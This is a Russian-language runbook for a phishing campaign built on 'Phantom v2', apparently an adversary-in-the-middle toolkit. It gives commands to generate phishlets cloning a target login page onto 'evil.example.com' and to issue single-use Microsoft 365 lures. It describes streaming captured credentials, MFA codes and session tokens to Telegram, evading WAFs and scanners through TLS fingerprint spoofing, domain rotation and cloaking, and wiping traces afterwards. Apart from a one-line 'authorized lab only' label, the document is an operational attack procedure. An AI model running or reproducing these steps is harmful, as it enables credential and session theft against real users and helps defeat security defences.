# Ранбук кампании Phantom v2 (только авторизованные работы, своя лаба)

## 0. Подготовка (разово)
1. VPS Windows/Linux, открытый 443 (или 8443 lab) + API-порт.
2. Домен кампании + доступ к DNS API (Cloudflare) для wildcard.
3. `config.yaml`: domains, `tls.email`, `dns_provider: cloudflare`,
   `wildcard: true`, `shared_443: true` (prod) / false (lab).
4. Секреты только env: `PHANTOM_API_TOKEN`, `TELEGRAM_BOT_TOKEN`,
   `TELEGRAM_CHAT_ID`, `CF_API_TOKEN`/`CF_ZONE_ID`, `LLM_API_KEY` (опц.).

## 1. Фишлеты
```sh
# Своя DB:
phantom -phishlets-pull https://github.com/<org>/phishlets-db.git -phishlets ./configs/phishlets
# Новый под цель:
phantom -gen -gen-origin login.target.com -gen-domain evil.example.com -gen-id target [-gen-html page.html] [-gen-llm http://localhost:11434/v1]
# Проверка без рестарта:
curl -X POST -H "X-Stealth-Host: ..." /api/v1/phishlets/reload  # 204
```
Боевой фишлет: заменить `REPLACE-ME`, живой прогон логина, сверить токены.

## 2. Запуск
```sh
phantom -validate -config config.yaml -phishlets configs/phishlets
# Linux: deploy.sh (systemd). Windows: deploy\install-service.ps1 (от админа).
```

## 3. Lures (раздача)
```sh
# Одноразовая с TTL и challenge:
curl -X POST .../api/v1/lures -d '{"path":"/l/op01","phishlet_id":"microsoft365","ttl_min":120,"max_uses":1,"require_challenge":true}'
```
Раздавать полный URL `https://m365.evil.example.com/l/op01`.

## 4. Мониторинг
- UI: `/ui/dashboard.html` (loopback), `/dashboard`, `/api/v1/stats`.
- Telegram: CREDS/MFA/TOKEN/BLOCKED + кнопки Drop/Block.
- SQLite `phantom.db`: факты captures (без plaintext).

## 5. Реагирование
- Подозрительный IP: кнопка Block или `POST /api/v1/block`.
- Слившаяся приманка: новый smart-lure, старый путь сам станет spoof.
- Детект WAF: `upstream_tls=chrome`, ротация доменов (multi-domain), Botguard уже режет сканеры в spoof.

## 6. Завершение
Остановить службу, снять DNS-записи, отозвать wildcard (ACME), выгрузить `phantom.db` в отчет, затереть Redis (`FLUSHDB` на кампейном инстансе).
